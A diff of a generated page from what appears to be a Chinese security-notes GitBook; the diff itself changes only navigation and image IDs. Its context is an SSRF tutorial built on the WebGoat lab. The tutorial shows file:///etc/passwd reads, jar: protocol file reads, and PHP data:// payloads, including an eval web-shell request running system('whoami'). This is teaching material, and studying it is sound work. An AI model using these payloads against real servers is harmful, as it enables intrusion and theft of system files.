@@ -61,6 +61,10 @@
                 
             
                 
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-lock/lock.css">
+                
+            
+                
                 <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
@@ -1093,6 +1097,19 @@
             
                     
                     15.Fastjson检测规则梳理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15.16" data-path="../99.其他/16.Chrome实时修改javascript.html">
+            
+                <a href="../99.其他/16.Chrome实时修改javascript.html">
+            
+                    
+                    16.Chrome实时修改javascript
             
                 </a>
             
@@ -3169,7 +3186,7 @@
     html <span class="token operator">=</span> <span class="token string">&quot;&lt;html&gt;&lt;body&gt;Although the http://ifconfig.pro site is down, you still managed to solve&quot;</span> <span class="token operator">+</span> <span class="token string">&quot; this exercise the right way!&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_29_yoFYD1dR.png" data-lightbox="55f438bd-6d14-4797-a7c4-ba32473a980e" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_29_yoFYD1dR.png" alt="image.png"></a>
+<p><a href="SSRF.assets/2023_05_19_10_39_29_yoFYD1dR.png" data-lightbox="b096de15-885c-47a6-8211-6de1d0a4d98c" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_29_yoFYD1dR.png" alt="image.png"></a>
 &#x5206;&#x6790;&#x4EE3;&#x7801;&#xFF0C;&#x5BF9;&#x8F93;&#x5165;&#x7684;URL&#x8FDB;&#x884C;&#x4E86;matches&#x5339;&#x914D;&#xFF0C;&#x53EA;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;<code>http://ifconfig.pro</code>&#xFF0C;&#x4E3A;&#x4E86;&#x67E5;&#x770B;&#x56DE;&#x663E;SSRF&#x6548;&#x679C;&#xFF0C;&#x5C06;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5339;&#x914D;&#x903B;&#x8F91;&#x4FEE;&#x6539;&#x5982;&#x4E0B;</p>
 <pre class="language-"><code class="lang-java">
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -3181,20 +3198,20 @@
      <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_30_A0n5s6UO.png" data-lightbox="975b629f-cbaa-4868-9fdf-fedd6a5c3cbf" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_30_A0n5s6UO.png" alt="image.png"></a>
+<p><a href="SSRF.assets/2023_05_19_10_39_30_A0n5s6UO.png" data-lightbox="3adcac7b-278a-4d88-82c0-1011909e9bef" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_30_A0n5s6UO.png" alt="image.png"></a>
 &#x5728;&#x8FD9;&#x91CC;&#x6D4B;&#x8BD5;&#xFF0C;&#x5728;url&#x4E2D;&#x8F93;&#x5165;<code>http://www.baidu.com</code>&#xFF0C;&#x5C31;&#x4F1A;&#x628A;&#x8BF7;&#x6C42;&#x5185;&#x5BB9;&#x8FD4;&#x56DE;&#x56DE;&#x6765;&#xFF0C;&#x8FD9;&#x79CD;&#x5C31;&#x53EB;&#x505A;&#x6709;&#x56DE;&#x663E;&#x7684;ssrf&#x63D0;&#x4EA4;&#x7684;URL&#x53C2;&#x6570;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4F7F;&#x7528;java.net.URL&#x7C7B;&#x53BB;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x6253;&#x5F00;URL&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x6D41;<code>InputStream in = new URL(url).openStream()</code>&#xFF0C;&#x6700;&#x540E;&#x5C06;&#x7ED3;&#x679C;&#x5904;&#x7406;&#x540E;&#x8FD4;&#x56DE;&#x7ED9;&#x524D;&#x7AEF;&#x3002;
-<a href="SSRF.assets/2023_05_19_10_39_30_FIx3pm7P.png" data-lightbox="4f05f168-735b-42c1-bb1e-af9b9c1d251c" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_30_FIx3pm7P.png" alt="image.png"></a></p>
+<a href="SSRF.assets/2023_05_19_10_39_30_FIx3pm7P.png" data-lightbox="220501d8-633a-4825-a96f-d580cc18ed81" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_30_FIx3pm7P.png" alt="image.png"></a></p>
 <h3 id="&#x4FA7;&#x4FE1;&#x606F;&#x7684;ssrf&#xFF08;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;&#xFF0C;&#x65F6;&#x95F4;&#x5EF6;&#x65F6;&#x7B49;&#xFF09;">&#x4FA7;&#x4FE1;&#x606F;&#x7684;SSRF&#xFF08;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;&#xFF0C;&#x65F6;&#x95F4;&#x5EF6;&#x65F6;&#x7B49;&#xFF09;</h3>
 <p>&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x56E0;&#x4E3A;&#x5728;&#x540E;&#x7AEF;&#x8FDB;&#x884C;&#x4E86;&#x76F8;&#x5E94;&#x5904;&#x7406;&#xFF0C;&#x65E0;&#x6CD5;&#x83B7;&#x5F97;&#x5B8C;&#x6574;&#x7684;&#x54CD;&#x5E94;&#x6E90;&#x7801;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x540E;&#x7AEF;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;&#xFF0C;&#x8BF7;&#x6C42;&#x54CD;&#x5E94;&#x5EF6;&#x65F6;&#x7B49;&#x6765;&#x5224;&#x65AD;SSRF&#x60C5;&#x51B5;&#x3002;&#x50CF;&#x4E0A;&#x9762;&#x7684;demo&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;&#x6A21;&#x62DF;&#x8FD9;&#x4E2A;&#x573A;&#x666F;&#xFF0C;&#x6210;&#x529F;&#x8BF7;&#x6C42;&#x8FD4;&#x56DE;1,&#x5931;&#x8D25;&#x8FD4;&#x56DE;0
-<a href="SSRF.assets/2023_05_19_10_39_31_E8gpakU3.png" data-lightbox="79f17997-414e-4479-8539-9f3249956585" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_31_E8gpakU3.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_31_E8gpakU3.png" data-lightbox="36306170-b8bf-45de-a777-5512ffb7f00f" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_31_E8gpakU3.png" alt="image.png"></a>
 &#x5F53;&#x8BF7;&#x6C42;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x57DF;&#x540D;&#x5BFC;&#x81F4;&#x5931;&#x8D25;&#xFF0C;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x8FD4;&#x56DE;0&#xFF1A;
-<a href="SSRF.assets/2023_05_19_10_39_31_rxZHscQI.png" data-lightbox="f6a9b48e-23c3-4ddc-a1a6-80e6a5488462" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_31_rxZHscQI.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_31_rxZHscQI.png" data-lightbox="727b13e3-a1f2-4043-96df-dd5123cf8490" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_31_rxZHscQI.png" alt="image.png"></a>
 &#x8FD9;&#x5C31;&#x662F;&#x6839;&#x636E;&#x56DE;&#x663E;&#x4FE1;&#x606F;&#x7684;&#x4E0D;&#x540C;&#x8868;&#x73B0;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6210;&#x529F;&#x53D1;&#x8D77;&#x4E86;&#x8BF7;&#x6C42;&#xFF0C;&#x5728;SSRF&#x4E2D;&#x53EF;&#x4EE5;&#x5BF9;&#x81EA;&#x8EAB;web&#x670D;&#x52A1;&#x8FDB;&#x884C;&#x8BF7;&#x6C42;&#x518D;&#x548C;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5730;&#x5740;&#x8BF7;&#x6C42;&#xFF0C;&#x53EF;&#x4EE5;&#x89C2;&#x5BDF;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x54CD;&#x5E94;&#x53C2;&#x6570;&#x503C;&#x3001;&#x54CD;&#x5E94;&#x5EF6;&#x65F6;&#x7B49;&#x8BF4;&#x660E;&#x6781;&#x6709;&#x53EF;&#x80FD;&#x5B58;&#x5728;SSRF&#x3002;</p>
 <h3 id="bind-ssrf&#xFF08;&#x5B8C;&#x5168;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#x6216;&#x5176;&#x4ED6;&#x4FA7;&#x4FE1;&#x606F;&#xFF09;">Bind SSRF&#xFF08;&#x5B8C;&#x5168;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#x6216;&#x5176;&#x4ED6;&#x4FA7;&#x4FE1;&#x606F;&#xFF09;</h3>
 <p>&#x8FD9;&#x4E00;&#x7C7B;&#x7684;SSRF&#x5C31;&#x5B8C;&#x5168;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#x548C;&#x4FA7;&#x4FE1;&#x606F;&#x6765;&#x6CC4;&#x9732;&#x5229;&#x7528;&#x7ED3;&#x679C;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FD4;&#x56DE;&#x59CB;&#x7EC8;&#x4E00;&#x81F4;&#xFF0C;&#x4E00;&#x822C;&#x7684;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;OOB&#x6570;&#x636E;&#x5E26;&#x5916;&#x6765;&#x89C2;&#x5BDF;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x5982;&#x4E0B;&#x4F7F;&#x7528;&#x7AEF;&#x53E3;&#x76D1;&#x542C;&#x65B9;&#x6CD5;&#xFF0C;vps&#x4E0A;&#x5F00;&#x542F;&#x7AEF;&#x53E3;&#x76D1;&#x542C;&#xFF0C;&#x5728;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x4F4D;&#x7F6E;&#x5199;&#x5165;vps&#x7684;&#x76D1;&#x542C;&#x5730;&#x5740;
-<a href="SSRF.assets/2023_05_19_10_39_31_t6U9Nk5m.png" data-lightbox="5a7897e0-5953-4f12-aa03-505e793abfaf" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_31_t6U9Nk5m.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_31_t6U9Nk5m.png" data-lightbox="f8e64635-e2cd-49b5-a759-9f07e9ce7a3a" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_31_t6U9Nk5m.png" alt="image.png"></a>
 &#x4F7F;&#x7528;dnslog&#x5E73;&#x53F0;&#x5224;&#x65AD;
-<a href="SSRF.assets/2023_05_19_10_39_32_3jeEaAsV.png" data-lightbox="31d945e4-4f23-4f6b-b5d8-14e0915df1bb" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_32_3jeEaAsV.png" alt="image.png"></a></p>
+<a href="SSRF.assets/2023_05_19_10_39_32_3jeEaAsV.png" data-lightbox="77ef32c8-43f4-49d5-b337-4310cb1a9b13" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_32_3jeEaAsV.png" alt="image.png"></a></p>
 <h2 id="ssrf&#x6F0F;&#x6D1E;&#x6316;&#x6398;">SSRF&#x6F0F;&#x6D1E;&#x6316;&#x6398;</h2>
 <h3 id="&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x573A;&#x666F;">&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x573A;&#x666F;</h3>
 <ul>
@@ -3241,7 +3258,7 @@
 <h3 id="java&#x4E2D;&#x7684;ssrf">JAVA&#x4E2D;&#x7684;SSRF</h3>
 <p>&#x4EA7;&#x751F;SSRF&#x7684;&#x539F;&#x56E0;&#x90FD;&#x662F;&#x5728;&#x4EE3;&#x7801;&#x5C42;&#x9762;&#x6CA1;&#x6709;&#x5BF9;&#x4F20;&#x5165;&#x7684;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x4E25;&#x683C;&#x9650;&#x5236;&#x3002;&#x5728;JAVA&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x4E2D;&#xFF0C;&#x4E0D;&#x4EC5;&#x8981;&#x5173;&#x6CE8;&#x53EF;&#x80FD;&#x5BF9;&#x5916;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x7684;&#x7C7B;&#x8C03;&#x7528;&#xFF0C;&#x4E5F;&#x8981;&#x5173;&#x6CE8;&#x4E00;&#x4E9B;&#x9650;&#x5236;&#x63AA;&#x65BD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x7ED5;&#x8FC7;&#x7684;&#x53EF;&#x80FD;&#xFF0C;&#x5728;&#x624B;&#x5DE5;&#x5BA1;&#x8BA1;&#x8FC7;&#x7A0B;&#x4E2D;&#x901A;&#x8FC7;&#x529F;&#x80FD;&#x70B9;&#x5BA1;&#x8BA1;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x7684;&#x5916;&#x90E8;&#x8BF7;&#x6C42;&#x7C7B;&#x548C;&#x7B2C;&#x4E09;&#x65B9;&#x5305;&#x7684;&#x4F7F;&#x7528;&#x4EE3;&#x7801;&#xFF0C;&#x8FDB;&#x800C;&#x5206;&#x6790;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x603B;&#x7ED3;&#x4E00;&#x4E9B;&#x53EF;&#x80FD;&#x5B58;&#x5728;SSRF&#x6F0F;&#x6D1E;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x5BA1;&#x8BA1;&#x65F6;&#x53EF;&#x4EE5;&#x67E5;&#x627E;&#x7C7B;&#x7684;&#x8C03;&#x7528;&#x4EE3;&#x7801;&#xFF0C;&#x89C2;&#x5BDF;&#x8F93;&#x5165;&#x662F;&#x5426;&#x53EF;&#x63A7;&#x3001;&#x4EE3;&#x7801;&#x8FC7;&#x6EE4;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x3002;
 &#x5728;webgoat&#x4E2D;&#xFF0C;SSRF&#x7684;&#x4E24;&#x4E2A;task&#x90FD;&#x662F;&#x505A;&#x8FC7;&#x9650;&#x5236;&#xFF0C;&#x6BD4;&#x5982;&#x5982;&#x4E0B;&#xFF0C;&#x5982;&#x679C;url&#x4E0D;&#x80FD;&#x5B8C;&#x5168;&#x5339;&#x914D;<code>http://ifconfig.pro</code>&#xFF0C;&#x5219;&#x65E0;&#x6CD5;&#x8FDB;&#x5165;&#x4EE3;&#x7801;&#x5C42;
-<a href="SSRF.assets/2023_05_19_10_39_32_6iFtGIaL.png" data-lightbox="56caeaba-d631-4d0b-835e-22a2f914067f" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_32_6iFtGIaL.png" alt="image.png"></a></p>
+<a href="SSRF.assets/2023_05_19_10_39_32_6iFtGIaL.png" data-lightbox="a78a5160-633e-495b-bd36-e4505c84ffbc" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_32_6iFtGIaL.png" alt="image.png"></a></p>
 <h4 id="java-&#x7684;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x7C7B;">JAVA &#x7684;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x7C7B;</h4>
 <p><strong>java.net.URL</strong>
 webgoat&#x9776;&#x573A;SSRF&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x4F7F;&#x7528;URL&#x7C7B;&#x4E2D;openStream()&#x6253;&#x5F00;&#x8FDC;&#x7A0B;&#x94FE;&#x63A5;&#x7684;&#x6570;&#x636E;&#x6D41;&#xFF1A;</p>
@@ -3453,22 +3470,22 @@ Feign&#x662F;&#x4E00;&#x4E2A;&#x58F0;&#x660E;&#x5F0F;WebService&#x5BA2;&#x6237;&
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
 <h2 id="ssrf-&#x53EF;&#x5229;&#x7528;&#x7684;&#x534F;&#x8BAE;">SSRF &#x53EF;&#x5229;&#x7528;&#x7684;&#x534F;&#x8BAE;</h2>
-<p><a href="SSRF.assets/2023_05_19_10_39_32_HQZ7namW.png" data-lightbox="77829011-5acc-40eb-a20f-d2c442b1021d" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_32_HQZ7namW.png" alt="image.png"></a></p>
+<p><a href="SSRF.assets/2023_05_19_10_39_32_HQZ7namW.png" data-lightbox="44f7267e-ad66-4cf5-9940-09074e30e982" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_32_HQZ7namW.png" alt="image.png"></a></p>
 <h3 id="java">JAVA</h3>
 <p>&#x7ECF;&#x8FC7;&#x6D4B;&#x8BD5;&#x5728;JDK15&#x4E2D;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x4EE5;&#x4E0B;&#x534F;&#x8BAE;&#x4F7F;&#x7528;&#xFF1A;http&#x3001;https&#x3001;ftp&#x3001;file&#x3001;jar&#x3001;mailto*,openjdk9&#x4E2D;&#x79FB;&#x9664;&#x4E86;&#x534F;&#x8BAE;<a href="https://bugs.openjdk.java.net/browse/JDK-8176351" target="_blank">netdoc</a>,JDK8&#x4E2D;&#x79FB;&#x9664;&#x4E86;gopher&#x534F;&#x8BAE;&#x7684;&#x652F;&#x6301;&#x3002;&#x4EE5;webgoat&#x9776;&#x573A;SSRF&#x4E3A;&#x4F8B;&#x6D4B;&#x8BD5;&#x90E8;&#x5206;&#x534F;&#x8BAE;&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x4F7F;&#x7528;file&#x534F;&#x8BAE;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;/&#x5217;&#x76EE;&#x5F55;(file:///etc/passwd)&#xFF1A;</p>
 <h4 id="file&#x534F;&#x8BAE;">file&#x534F;&#x8BAE;</h4>
-<p><a href="SSRF.assets/2023_05_19_10_39_32_U6ONqAEg.png" data-lightbox="fa34de59-8eac-4656-bb8d-f64acdd40adc" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_32_U6ONqAEg.png" alt="image.png"></a></p>
+<p><a href="SSRF.assets/2023_05_19_10_39_32_U6ONqAEg.png" data-lightbox="d3c96e95-f96e-48f9-bbb9-a4e8b5fd157b" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_32_U6ONqAEg.png" alt="image.png"></a></p>
 <h4 id="jar&#x534F;&#x8BAE;">Jar&#x534F;&#x8BAE;</h4>
 <p>&#x9700;&#x8981;&#x6E90;&#x6587;&#x4EF6;&#x4E3A;zip&#x6216;&#x8005;jar&#x5305;&#xFF0C;&#x6765;&#x672C;&#x5730;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</p>
 <pre class="language-"><code class="lang-shell">jar:file:///home/luogan/Desktop/test.zip<span class="token operator">!</span>/ShiroExploit.V2.51/config/keys.conf
 jar:file:///home/luogan/Desktop/ShiroExploit.V2.51/ShiroExploit.jar<span class="token operator">!</span>/my.css
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_33_PZ0cHFXD.png" data-lightbox="b8506391-3d32-409d-a839-827c812c1ee3" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_33_PZ0cHFXD.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_33_lU3yk0Xj.png" data-lightbox="996d8052-419e-4c23-9d69-a577f7d10f29" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_33_lU3yk0Xj.png" alt="image.png"></a>
+<p><a href="SSRF.assets/2023_05_19_10_39_33_PZ0cHFXD.png" data-lightbox="d6a70ab5-5d4a-4885-9083-43552aaf2961" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_33_PZ0cHFXD.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_33_lU3yk0Xj.png" data-lightbox="88188f00-e834-466e-a44b-765d9ee80316" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_33_lU3yk0Xj.png" alt="image.png"></a>
 jar&#x534F;&#x8BAE;&#x8BFB;&#x53D6;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;(jar:http(s)://x.x.x/xx.zip!/file.txt)&#xFF0C;&#x540C;&#x65F6;&#x4F1A;&#x4E0B;&#x8F7D;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x7F13;&#x5B58;&#x4E2D;&#xFF1A;</p>
 <pre class="language-"><code class="lang-shell">jar:http://127.0.0.1:8888/ShiroExploit.V2.51/ShiroExploit.jar<span class="token operator">!</span>/my.css
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_34_kQSuPxf3.png" data-lightbox="67c50f5a-878c-4bd2-a8ab-82fe3e285644" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_34_kQSuPxf3.png" alt="image.png"></a></p>
+<p><a href="SSRF.assets/2023_05_19_10_39_34_kQSuPxf3.png" data-lightbox="3bbf06ac-2d37-4988-ba2a-3a7d787a4736" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_34_kQSuPxf3.png" alt="image.png"></a></p>
 <h4 id="javanethttpurlconnection&#x7C7B;&#x8F6C;&#x6362;">java.net.HttpURLConnection&#x7C7B;&#x8F6C;&#x6362;</h4>
 <p>&#x90E8;&#x5206;&#x7C7B;&#x652F;&#x6301;&#x7684;&#x534F;&#x8BAE;&#x4F1A;&#x8FDB;&#x884C;&#x9650;&#x5236;&#xFF0C;&#x4F7F;&#x7528;&#x4E86;HttpURLConnection&#x5BF9;openConnection&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#x540E;&#x7684;&#x8BF7;&#x6C42;&#x5C31;&#x53EA;&#x652F;&#x6301;HTTP(S)&#xFF1A;</p>
 <pre class="language-"><code class="lang-java"><span class="token class-name">String</span> html <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
@@ -3487,8 +3504,8 @@ jar&#x534F;&#x8BAE;&#x8BFB;&#x53D6;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;(jar:http(s):
     <span class="token keyword">return</span> <span class="token function">getFailedResult</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_34_ObQWCeVs.png" data-lightbox="e6999107-c38a-4fd8-b12a-ecbf2f87028b" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_34_ObQWCeVs.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_34_pJeOlPz0.png" data-lightbox="3b532824-9ad9-4234-8638-01d4baab1db9" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_34_pJeOlPz0.png" alt="image.png"></a></p>
+<p><a href="SSRF.assets/2023_05_19_10_39_34_ObQWCeVs.png" data-lightbox="e8840797-fb1b-45ba-8d25-88ccc9749b19" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_34_ObQWCeVs.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_34_pJeOlPz0.png" data-lightbox="2200cb2b-e98a-459f-b42d-fd98a6a29826" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_34_pJeOlPz0.png" alt="image.png"></a></p>
 <h4 id="mailto">mailto</h4>
 <p>mailto&#x534F;&#x8BAE;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#xFF0C;&#x8BE5;&#x534F;&#x8BAE;&#x7684;&#x5229;&#x7528;&#x9700;&#x8981;&#x540E;&#x7AEF;&#x914D;&#x7F6E;&#x4E86;&#x90AE;&#x4EF6;&#x7684;&#x53D1;&#x9001;&#x670D;&#x52A1;&#x5668;&#x548C;&#x76F8;&#x5173;&#x7684;&#x652F;&#x6301;&#x624D;&#x80FD;&#x6B63;&#x5E38;&#x4F7F;&#x7528;&#xFF0C;&#x534F;&#x8BAE;&#x683C;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p>
 <pre class="language-"><code class="lang-shell">mailto:name1@rapidtables.com?cc<span class="token operator">=</span>name2@rapidtables.com<span class="token operator">&amp;</span><span class="token assign-left variable">bcc</span><span class="token operator">=</span>name3@rapidtables.com
@@ -3522,11 +3539,11 @@ gopher:// &#x2014;&#x2014; &#x4FE1;&#x606F;&#x67E5;&#x627E;&#x7CFB;&#x7EDF;&#x53
 </code></pre>
 <pre class="language-"><code class="lang-http"><span class="token header"><span class="token header-name keyword">data</span><span class="token punctuation">:</span><span class="token header-value">//text/plain,&lt;?php%20phpinfo();</span></span>
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_35_d4sbQ3gG.png" data-lightbox="d424385b-de46-4928-8410-4d31508e599e" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_35_d4sbQ3gG.png" alt="image.png"></a>
-<a href="SSRF.assets/2023_05_19_10_39_35_wlK3CEOz.png" data-lightbox="202fc4ab-ee3e-46f8-ada8-8de364bada98" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_35_wlK3CEOz.png" alt="image.png"></a></p>
+<p><a href="SSRF.assets/2023_05_19_10_39_35_d4sbQ3gG.png" data-lightbox="a9037f70-d34b-4635-83fc-2deb6c0ad435" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_35_d4sbQ3gG.png" alt="image.png"></a>
+<a href="SSRF.assets/2023_05_19_10_39_35_wlK3CEOz.png" data-lightbox="7bbf335c-51a2-45f2-8a19-bf98faf547d4" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_35_wlK3CEOz.png" alt="image.png"></a></p>
 <pre class="language-"><code class="lang-http"><span class="token header"><span class="token header-name keyword">data</span><span class="token punctuation">:</span><span class="token header-value">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span>
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_36_2nhMxevI.png" data-lightbox="097e3d5c-1dfa-4c82-831c-53735bbba8f1" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_36_2nhMxevI.png" alt="image.png"></a></p>
+<p><a href="SSRF.assets/2023_05_19_10_39_36_2nhMxevI.png" data-lightbox="a22410b9-496a-4ab4-826c-95a5b8c6d945" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_36_2nhMxevI.png" alt="image.png"></a></p>
 <pre class="language-"><code class="lang-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/index.php?url=data://text/plain,&lt;?php+@eval($_POST[&apos;cmd&apos;]);</span> <span class="token http-version property">HTTP/1.1</span></span>
 <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
 <span class="token header"><span class="token header-name keyword">sec-ch-ua</span><span class="token punctuation">:</span> <span class="token header-value">&quot;Chromium&quot;;v=&quot;91&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span></span>
@@ -3546,17 +3563,17 @@ gopher:// &#x2014;&#x2014; &#x4FE1;&#x606F;&#x67E5;&#x627E;&#x7CFB;&#x7EDF;&#x53
 
 cmd=system(&apos;whoami&apos;);
 </code></pre>
-<p><a href="SSRF.assets/2023_05_19_10_39_36_w23LTOnA.png" data-lightbox="fe45f797-726a-411e-be74-2df809a07ecf" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_36_w23LTOnA.png" alt="image.png"></a></p>
+<p><a href="SSRF.assets/2023_05_19_10_39_36_w23LTOnA.png" data-lightbox="5cb6afad-a706-433e-8f96-c078c4518d2e" data-title="image.png"><img src="SSRF.assets/2023_05_19_10_39_36_w23LTOnA.png" alt="image.png"></a></p>
 <h4 id="dict-&#x534F;&#x8BAE;">DICT &#x534F;&#x8BAE;</h4>
 <p>DICT&#x534F;&#x8BAE;&#x662F;&#x8BCD;&#x5178;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#xFF0C;&#x5728;RFC 2009&#x4E2D;&#x8FDB;&#x884C;&#x63CF;&#x8FF0;&#xFF0C;&#x4F7F;&#x7528;&#x7A7A;&#x683C;&#x6216;&#x8005;:&#x4F5C;&#x4E3A;&#x5206;&#x9694;&#x53C2;&#x6570;&#x3002;&#x5728;&#x5229;&#x7528;dict&#x534F;&#x8BAE;&#x4E2D;&#xFF0C;&#x4E00;&#x884C;&#x53EA;&#x80FD;&#x5305;&#x62EC;&#x4E00;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x4E0D;&#x80FD;&#x8F93;&#x5165;&#x591A;&#x884C;&#x547D;&#x4EE4;(&#x6240;&#x4EE5;&#x4E0D;&#x80FD;&#x653B;&#x51FB;&#x8BA4;&#x8BC1;&#x7684;redis)&#xFF1A;
